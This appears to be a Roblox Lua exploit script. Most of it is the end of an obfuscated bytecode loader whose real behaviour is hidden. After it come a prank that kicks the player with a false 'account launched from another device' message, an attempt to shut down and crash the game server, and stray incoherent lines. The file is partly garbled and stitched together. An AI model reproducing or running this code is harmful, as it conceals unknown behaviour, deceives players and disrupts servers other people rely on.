f=f+(0x001);end;elseif(c<=(3))then if(b[a[e]]<b[a[g]])then f=a[d];else f=f+(1);end;end;elseif(c<=(46))then if(h[a[e]]<b[a[g]])then f=a[d];else f=f+(1);end;elseif(c==(0x019))then local c=a[e];local e=b[a[d]];b[c+(1)]=e;b[c]=e[b[a[g]]];elseif(c<=(22))then local c=a[e];local a=a[d];for a=(1),a,(1) do b[c+a-(1)]=t[a-(1)];end;end;elseif(c<=(42))then if(c<=(0x028))then b[a[e]]=h[a[d]];elseif(c>(41))then local a=a[e];b[a]=b[a]();elseif(c<(42))then local c=a[e];local g=b[c+(2)];local e=b[c]+g;b[c]=e;if(g>(0))then if(e<=b[c+(0x001)])then f=a[d];b[c+(3)]=e;end;elseif(e>=b[c+(1)])then f=a[d];b[c+(3)]=e;end;elseif(c<=(46))then if(c==(0x021))then local e=a[e];local d=({b[e](j(b,e+(0x001),a[d]))});local c=(0);for a=e,a[g],(1) do c=c+(0x001);b[a]=d[c];end;elseif(c<=(33))then local a=a[e];b[a](b[a+(0x001)]);end;elseif(c<=(46))then b[a[e]]=h[a[d]]%h[a[g]];elseif(c>(17))then b[a[e]]=b[a[d]]/h[a[g]];elseif(c<(9))then if(h[a[e]]<=h[a[g]])then f=a[d];else f=f+(1);end;end;elseif(c<=(0x02B))then if(b[a[e]])then f=f+(1);else f=a[d];end;elseif(c>(44))then f=a[d];elseif(c<(45))then b[a[e]]=(a[d]~=(0));elseif(c<=(0x02E))then if(c>(17))then if(b[a[e]]~=b[a[g]])then f=f+(0x001);else f=a[d];end;elseif(c<(22))then local f=({});local c=a[d];for a=c,i,(0x001) do f[(a-c)+(0x001)]=b[a];b[a]=(nil);end;b[a[e]]=f;end;elseif(c<=(0x02E))then if(b[a[e]]==b[a[g]])then f=f+(0x001);else f=a[d];end;elseif(c>(3))then b[a[e]]=r(u[a[d]],(nil),m);elseif(c<(0x000))then if(b[a[e]]<b[a[g]])then f=a[d];else f=f+(1);end;end;f=f+(1);end;end);end;return r(F(),{},H())();end)("25S26327527626325R27725F27727C27725L26R26326027626227D26327F27C26127L27N27I27527S27C26725O26325M26327K27K27D27R27626627L26327327C26527Q27G27U26427L27W26325Y28026328627L25U27C28O27D26Z25P26328Q28U27J27728O28226327428N28K27525Z28726X26329627528V29026726Q26325V28K28M27C25L25E26327P27529J27E27G27728B27L28F29O28L28X27529E26326728K29027C25W2942872802A327526J29X27625V24B24F26625T27624D24Y24P25A23S25A24P24T2AR2AI2AB26324S25624Y24V2AD27D21726C2772A727627B2A927629L2A82A929H2A527629X26526O28I2BD27V25D2BL2BG28P2BA27626Z26Y2A929X2BU2BS2752BJ29Z28G2BO2752BQ28Y2BM28328D2C227C29W27L29D2C42C82B62CH27V2762AI29U26324R24Y2512582AU2662AW2AY2B02AI29J25925325625824O2B227C24224B27725X27A2BZ27M29S27627U27E29M29D28728927729Q27727429X2AW29X27N2DM28G27X27427K2DG2C727728F28R28T2E22632E52AE28Z27628V2BR2902AK27L2982EE2E62C22A128B2DY2872A72C627726027U2D52772B42AI29H27524V25025124U2522552CT2EH2AM2AO2AQ2AS2AR2DU2B82DC28W2BZ2DT2CB2E129N2CE2CI2EP2772902ET2762D72FC2752B92BZ2EB2A92FH2C52872CD27D2A52EO2BZ2FP2AE27523M2D82852DB2DC2FX2872FZ2CJ2G227C2G42CJ2FO2762FQ26324B2572GB29P2GD2FW2DC2GH2EP2GJ2GN2762G52BS2G727C1R2552GT29Y2FD2GE2GX2DE2G029V2FK2G32FM2G62GO2G826324Y2H929Q2FV2BS2GF28C2GK2G12HH2HV2H22GM2C22GP24B2502HP2GV2HS2HD2HY27D2H02CB2H32BA2H52771R24P2I52HB2GW2FG2HE2GI2HX2H12752ID2A92IF27621N24U24B24Z2I62FY29M25J2BS2BC26W2FI27528S2A829026Z2BB27G27Z27T2872702A82AW27C2AK2AW2FN2BW2772BF27L2BX28T2IQ25L2JD26329M2JG27L25K27H2C22JT2A829X29827527N2DE2JK2772K22DR2BH2BT28T29027U2K82DD2632FV2DN2762K229J27U2K52DJ2752KL27N2JI2C02872K22CN2KF2J82KI2GC2KW2JX2712762E527C2K22E529J2DS29M2792L028R2BV2CN2CN25Q2JX28J2752LC2BB2JZ2AF27L2BY2EX29G2EA2JX2AW2HT27N25H2762EH2JL2632EH2LZ2BS2CN2LH2632J62LS2LX2E42LB2762DA2K927G2902HT2632K228V2E72BT2BV2E52E52LZ2J92MY2KG2MO2632CG2MR2MT2ML2752BI2J32G02LZ2AE2792LT27L2792CN2872J92MQ2DF2JX27227629227D2LP27729A2A826J2LA29F2952HZ2KQ2992M12NA2LU26325I2M727L2652J32812912N32752792JO2OH2M02BS2GJ2EH2JB2L62752EH2NW27N2DL2O427L2NU2762LR2HX2NY2632O02BL2GU2AC2LA27X2752P02K22C02J327P27K2MN2IP2NG2BZ2NJ2BZ2K22PH2EH2KU2NR2762JU2KM25N2OZ2OB2J327I2PG2CB2792MC2L12632PH2NS2PQ2O12752PT27N2E52PH29T2J32A327K2B72BD2Q22PM2632QJ2NW2Q82P52632QB27G25G2O228A2J328627K2PV2HF2OK2Q32K12632R12QR2QQ2PH2QT2OF2752R72QF2632EL27Y2Q12OL2BA2K22JF2Q52OG2NM2QW2RB2CN2RN2RF28F27K2JW2R22782RK2A92K22RY2QN2RP2OQ2R62PS2JX2EH2S42RF2JR2PC2QK2S12Q42SF2R72QQ2RN2RB25C2O327D2OC28W27K2LJ2SG2R427D2K22SU2RN2QQ2S42RB2BV2OK2SQ2J32AK27K2OY2A52QL2BS2K22OY2S42AE2IS28726P2CL2CU27625225624V24Z2AI2RN23T25A24R25324Y2542TP25A25B23S2EZ24P2D225A2AI2NW23W2AZ24V24D25024P24824Z24Y25325B2CM27623Z25025825825325A2GP24X1Z2AH26629X24S24O2AI28V23V2CQ25826Z26I26J24W26O2EW2762V32CR26Z26G2V92AI2SO27524F25A25925624U25324V2UG2TP23S24I24O24V25A2522VS24V24E2AT25124V2V02662CN2U525125B2502522V12VC2V42V626N2VH2662LZ2VD2V526K2WJ27U24925024J2UL27526C2WW2WX2AI2EH24C25A24V2F924T2TY2U72W72762CP2CR2CT2WL2WG26I2WJ2T426324Z24V24V24R24O26926S26S24R2562VW25A2552CQ26T2542WC26S2U524S26S23T24T24126J24Q25A24S2WD2662NW2482AO2U023W2CQ2WB24S2WU2632F12F32CT2CN2VW24P2V42AI27U2AO24R2YL24924U2XK2F02AV27624V24I24R2X72O927524225926Z24I25024U26Z24R2AO24O24O26Z25626Z25325024V26Z2502ZC2552Z02EZ2512W62P02X42AR26Z2WM2CT2RN23S25624I24625A2ZK2U62TU24Q24U310B24V2WE2752WM2V62WO2VA2AJ2762ZP25625B2YR2YT26629J24O2XR24S2512FQ22J22N25H24A2VB310K2WG26M2WJ2E52432XK24R2X1310I2662KL2YE2XS24Z26Z310124P26V26Z26A26A27226Z2EZ26Z24W2TY24W2ZD2ZF24P24O25A2532592AI2E52AQ25424V24Y2Z22TM2752582562522X72NW2AQ2WA26Z2TU2522ZQ310B2U827623W2UH2UR31032V42CT2XH312V25A25131212ZG2542TX25424W311Q2TQ2AR25A26Z2TO24I26Z2F42ZO2D22W62VJ2632ZE2ZG313G26Z2CS2ZR311Y31392U126Z24S2B0311M311S2722AI2S4246310S313E255313H25624S25B2XS26W26B26K314H2Z32752D02D2",{[((1762))]="\109";[-((0x21A))]="\97";[((0x10E4))]=(((2028)));[-((1984))]=((#{(938);(694);(0x201);(788);}+(692)));[((0x215))]="\50";[-((#{(0x05A);(0x33A);(0x313);(0x3D1);}+(1661)))]=(((1095)));[((3195))]=((0x470));[((4031))]=(((0x512)));[-((#{}+(2375)))]=(((#{(0x043);(0x070);(0x231);(0x137);}+(959))));[((#{(0x094);(0x2B1);(580);(473);}+(0x26B)))]="\116";[-((#{[(0x102)]=(39);[(507)]=(0x1C1);[(0x2D7)]=(576);[(642)]=(192);(0x1AA);}+(0xC68)))]=((#{((#{}+(0x05A)));(146);(0x000);(0x3DE);}-(0x001)));[((#{(0x138);(0x2B0);}+(0xE3D)))]=((0x06E));[((1739))]="\99";[((0xF0B))]=((#{(754);((0x210));}+(0x3F0)));[-((#{(0x101);}+(0x4A1)))]="\99";[((3481))]=((0x274));[-((#{}+(0x062)))]="\117";[((#{(798);(715);(0x0B7);(0x332);}+(0x1230)))]=((#{((#{(0x3CE);[(718)]=(0x1D9);(125);}+(0x200)));[((808))]=(0x114);((899));[(568)]=(26);((0x2FB));[((0x16C))]=(939);((461));}+(0x0FC)));[((#{(0x368);[(552)]=(0x1C6);(0x181);(446);[(0x1DA)]=(0x2AE);[(0x2AF)]=(532);(0x222);}+(4568)))]=((0x8FC));[((#{}+(0xDF5)))]=((1600));[-((1542))]=((#{((0x194));((0x197));}+((#{[(917)]=(0x3A3);(0x3BE);[(0x2BE)]=(923);[(0x2DD)]=(214);[(0x042)]=(198);(0x294);}+(238)))));[-((0xE0B))]=((1348));[((1678))]="\110";[-((#{}+(2916)))]=((#{[((789))]=((0x2AF));(566);(964);((46));((#{(743);(0x28C);(823);(619);}+(0x37C)));}+(1182)));[-((0x3EE))]="\110";[-((#{(0x0F1);(775);[(236)]=(553);(0x11B);(659);}+(0xEA1)))]=((#{(27);[((#{(122);(751);[(406)]=(0x39D);(359);(0x120);}+(69)))]=(922);((862));((#{(0x14A);(136);(790);}+(0x298)));}+(0xC66)));[((0xC05))]=((0x062));[((3899))]=((#{}+(0x339)));[-((#{(553);(0x259);}+(0x561)))]=((0x2C8));[((0xA56))]="\110";[((#{(0x135);(0x2B5);}+(2774)))]=((#{}+(0x160)));[-((#{}+(1763)))]=(((#{(179);(775);[(453)]=(483);(130);}+(0x55E))));[((#{(960);(0x260);}+(2882)))]=(((#{[(0x331)]=(0x27A);(0x37C);(0x036);(0x1D6);}-(0x003))));[-((0xE72))]=(((#{(0x2FC);(869);(0x143);(0x08C);}+(2198))));[-((#{[(518)]=(0x1EF);(331);(769);(0x237);(0x0E0);}+(0x013)))]="\114";[-((0x43B))]="\101";[-((3476))]=((#{[(0x14D)]=(743);((0x332));(0x396);(0x26D);}+(0x01D)));[-((0x8EA))]=((0x392));[((0x447))]="\116";[-((#{(0x376);}+(0xBC2)))]=((0x7C0));[((#{(0x0CB);(0x241);(0x2F4);(691);}+(0x9A7)))]="\116";[((3761))]=((186));[((#{[(507)]=(721);(591);(371);(0x26F);}+(0xD08)))]=(((0x21A)));[((0x1322))]=((#{((#{(0x1A5);}+(0x3A9)));((0x39A));((#{}+(880)));}+((#{(948);}+(739)))));[-((#{(0x1F5);(0x06D);(0x160);(0x1DD);}+(1851)))]=((0x25B));[((#{(0x194);}+(0xD40)))]=(((0x5BC)));[-((0xC5B))]=((36));[((352))]="\98";[-((#{}+(300)))]="\97";[((0x3F2))]="\114";[-((#{[(430)]=(916);(0x373);(0x3D1);}+(231)))]="\101";[-((0xCE1))]=(((16777216)));[((801))]="\121";[-((#{(387);}+(2631)))]=((#{}+((908))));[((0x09E))]="\116";[((#{}+(3174)))]=(((300)));[((0x9F6))]="\97";[-((#{(0x354);(327);(0x230);(59);}+(0x427)))]="\108";[-((0x0BA))]="\101";[((0x107C))]=((#{[(961)]=(213);((0x324));(701);((424));[(505)]=(0x0BB);(0x0D5);}+(0x9F2)));[-((322))]="\108";[((0x1394))]=((#{(543);}+((20))));[((#{(0x2E7);}+(0x8FB)))]="\101";[((#{}+(0x392)))]="\117";[-((0x12B))]="\109";[((#{(0x279);(0x05C);(0x133);}+(821)))]="\115";[((712))]="\120";[((#{(0x118);(807);(161);[(0x1D1)]=(171);(0x389);}+(0x7BC)))]="\116";[((0x088))]="\101";[((#{(413);(0x0AB);}+(0xB8D)))]=((801));[((#{}+(1468)))]="\107";[((0xE83))]=((117));[((2718))]="\35";[-((#{(760);}+(116)))]="\109";[((#{(661);(0x12F);(594);(0x39F);}+(238)))]="\98";[-((3349))]=((#{[(0x173)]=(967);(154);}+(1371)));[((#{(0x2AB);(597);(0x398);(0x141);}+(0x7E8)))]="\97";[((0x122))]="\105";[-((0x815))]=((0x30F));[-((#{}+(0x38C)))]="\120";[((#{(0x116);}+(1225)))]="\101";[-((0x9E6))]=((#{((#{(264);[(413)]=(551);(0x191);}+(750)));}+(1899)));[((0xF35))]=((#{(888);((0x242));}+((0x714))));[((#{(78);(0x1A5);}+(4560)))]=(((0x89B)));[-((0x78A))]=(((#{(0x016);(0x318);(656);(0x393);}+(1531))));[((0x101B))]=(((414)));[((0x640))]="\108";[((0x12D6))]=((65536));[-((0x1F0))]="\117";[((#{}+(0x3C3)))]="\98";[-((1474))]=((#{(0x310);(934);}+(784)));[-((0xDBE))]=(((2047)));[-((0x849))]=((1739));[((0x1444))]=(((0x8E6)));[-((0xBFB))]=((#{((377));(0x137);[(0x2F7)]=(0x1EE);((0x303));}+((2389))));[-((#{(0x034);[(875)]=(136);(0x08B);(0x05A);}-(0x001)))]="\97";[-((0x4CE))]=(((#{[(0x225)]=(0x2A5);(0x2DC);(810);(310);(0x145);}+(286))));[((0xC63))]=((#{((8));((#{(0x3E5);[(0x27C)]=(476);(42);(0x273);}+(0x0AB)));((#{(0x11C);(0x146);(829);}+(299)));}+(0x442)));[((#{(524);[(275)]=(535);(166);(665);}+(62)))]="\99";[-((0x82A))]=((0x68E));[((0x5FF))]="\97";[((0xBE1))]=((#{((0x071));}+((64))));[-((110))]="\116";[-((#{(0x3BD);(0x290);(208);}+(1113)))]="\111";[-((2200))]=(((#{(503);(593);}+(0x372))));[((#{[(0x222)]=(0x231);[(876)]=(0x237);(894);(0x2C0);}+(4751)))]=((#{(531);((232));(802);}+(0x0D8)));[-((#{(0x39D);(261);[(198)]=(603);(0x351);(20);}+(410)))]="\116";[-((0x64D))]=((#{}+(0x338)));[((1814))]="\97";[((0x445))]="\116";[((0x13B4))]=(((0x3FF)));[-((0xD21))]=((470));[-((#{(299);(713);(0x336);}+(1586)))]=(((#{(0x1AE);(0x12A);(0x1F3);(0x16C);}+(19))));[-((#{(622);(990);(686);(0x23A);}+(0x4C6)))]=((#{(342);[(0x065)]=(0x3B6);[(402)]=((#{}+(0x25C)));((322));((0x1D4));}+(0x212)));[((#{(91);(0x0B4);(0x243);}+(881)))]="\111";[-((#{(377);[(531)]=(0x3B5);(744);[(733)]=(553);[(833)]=(603);(8);}+(693)))]="\101";[((#{(0x25D);(0x38B);(0x3C0);}+(0xB28)))]=((481));[((#{(130);[(0x0B9)]=(0x1E9);[(214)]=(0x232);(370);(369);(803);}+(0xAC1)))]=((2));[((4288))]=((#{(425);((344));((596));}+((0x438))));[((0x76C))]="\108";[-((#{}+(628)))]="\116";[-((0xCA4))]=((4));[-((0xACC))]=((#{(287);[(846)]=(413);((#{(237);(844);}+(106)));}+(0x429)));[((1136))]="\116";[((2788))]=((#{[((#{(0x2B2);(0x015);}+(735)))]=((129));((592));[((0x25B))]=((0x105));[(0x167)]=((112));((0x1C0));(0x1CE);(554);}+(0x180)));[-((#{(0x0D5);(701);}+(0x181)))]="\101";[-((#{(0x051);(740);(0x2A9);[(0x1C2)]=(0x1A5);[(0x05B)]=(587);[(0x046)]=(327);(0x257);}+(0x30B)))]="\117";[-((0xAFE))]=((#{((0x38D));((248));}+((0x45A))));[-((#{(0x3AB);}+(2454)))]=((1762));[((#{}+(0x1189)))]=(((#{(0x176);(623);(0x099);}+(1003))));[((#{(0x2F1);(0x08D);(219);(0x064);}+(384)))]="\116";[-((#{}+(1638)))]=((#{}+((#{(949);[(909)]=(258);(610);(337);}+(230)))));[((0x561))]="\112";[((0x89B))]="\115";[-((2721))]=((0x183));[((4399))]=(((#{(299);(0x1B5);(0x149);}+(2181))));[-((3665))]=((#{(549);((386));((0x2CC));}+((0x6A8))));[-((#{(847);(0x005);}+(0xBDE)))]=((2120));[-((0x60C))]=(((0x088)));[((0x312))]="\114";[((0xCE9))]=((#{(437);}+(0x1EF)));[((1298))]="\99";[((#{(0x22A);[(351)]=(805);(0x172);(59);}+(2181)))]="\105";[-((#{(558);}+(1300)))]=(((623)));[-((603))]="\99";[((2120))]="\101";[((#{[(0x114)]=(0x317);(0x280);(878);[(0x2E0)]=(713);(0x1F2);}+(0x1377)))]=((0x61A));[((#{(893);}+(0x13DB)))]=(((#{(629);(291);(540);}+(0x2CE))));[((#{[(884)]=(658);(0x2D3);(365);[(839)]=(0x39A);(0x2BB);(176);}+(3029)))]=(((158)));[((#{(19);[(86)]=(829);[(0x340)]=(0x037);[(0x193)]=(0x224);(0x30D);}+(0xCBF)))]=((#{(545);(970);(0x2E8);((#{(665);[(0x2F8)]=(0x201);(170);(0x3BE);}+(20)));}+(318)));[((0x958))]="\114";[((0x1410))]=((#{}+((4172))));[-((3459))]=((560));[-((0x339))]="\104";[((3974))]=(((1226)));[((0x104E))]=((0x9AB));[-((2846))]=((#{[(0x0CB)]=(660);[(414)]=(0x008);(0x297);[(0x013)]=((0x26B));((#{(0x1D9);}+(0x207)));((#{(185);}+(494)));(0x2E6);}+((#{(315);(124);(0x16B);[(0x1A9)]=(0x28B);(248);}+(2638)))));[-((#{(959);(522);(0x1D9);(0x36F);}+(0x4BF)))]=((#{(0x117);}+(0)));[-((0xD0A))]=((0xA9E));[((#{(0x08D);(0x1EE);(0x2F6);}+(478)))]="\51";[-((#{(0x1F0);[(487)]=(972);(0x32D);(204);}+(0x67A)))]=((299));},(function(...)end));

---- SCARE PPL
wait(54)
script.Parent.MouseButton1Click:Connect(function()
 game.Players.LocalPlayer:Kick("Same Account Launched From a diffrent device") --- nothing happend just to scaare them lol
end)




---- IF STATMENTS ----
if Target.CharacterWalkSpeed == 16 then
	print(FAILEDTXT)
end


--- 308 Lines Of Code Milestone
game:Shutdown();
print("I Did my best to crash this server.")
